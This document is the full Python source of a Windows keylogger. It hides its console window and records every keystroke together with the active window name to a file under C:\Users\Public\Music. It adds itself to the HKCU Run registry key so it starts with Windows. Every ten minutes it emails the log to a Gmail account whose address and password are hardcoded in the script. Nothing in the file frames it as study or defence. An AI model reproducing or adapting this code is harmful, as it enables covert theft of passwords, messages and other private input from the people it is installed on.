import PyHook3, pythoncom
import subprocess
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32console,win32gui
import threading

logFile = "C:\\Users\\Public\\Music\\log2.txt"

linebuf = ""
windowName = ""

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def loot():
    while True:
        mail = smtplib.SMTP('smtp.gmail.com', 587)
        msg = MIMEMultipart()
        address = 'wkwkdausfpemqnf@gmail.com'
        password = 'Wkwkdaus!2213'

        msg['Subject'] = 'Log '
        msg['From'] = address
        msg['To'] = address

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(logFile, "rb").read())
        encoders.encode_base64(part)

        part.add_header('Content-Disposition', 'attachment; filename="C:\\Users\\Public\\Music\\log2.txt"')
        msg.attach(part)

        # server connection and actually sending the formatted email.
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(address, password)
        server.sendmail(address, address, msg.as_string())
        server.quit()

        time.sleep(600)

def writeToFile(line):
    fd = open(logFile,'a')
    fd.write(line)
    fd.close()

def init():
    fd = open(logFile, 'a')
    fd.write("Pykeylogger have started.\n")
    fd.close()

def OnKeyboardEvent(event):
    global linebuf
    global windowName

    if windowName != event.WindowName:
        if linebuf != "":
            linebuf += '\n'
            writeToFile(linebuf)

        linebuf = ""
        newStart = "\nProgram: " + str(event.WindowName.encode('UTF-8')) + "\n"
        writeToFile(newStart)
        windowName = event.WindowName

    if event.Ascii == 13 or event.Ascii == 9:
        linebuf += '\n'
        writeToFile(linebuf)
        linebuf = ""
        return True

    elif event.Ascii == 8:
        linebuf = linebuf[:-1]
        return True

    else:
        linebuf += chr(event.Ascii)

    return True


def main():
    hide()
    init()

    filepath = 'C:\\Users\\Public\\Music\\pylogger.exe'
    subprocess.call(r'reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "pylogger" /t REG_SZ /f /d "%s"' % filepath)

    # Start a thread. This will keep executing by itself
    threading.Thread(target=loot).start()

    # Receive events
    hooksMan = PyHook3.HookManager()
    hooksMan.KeyDown = OnKeyboardEvent
    hooksMan.HookKeyboard()

    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()

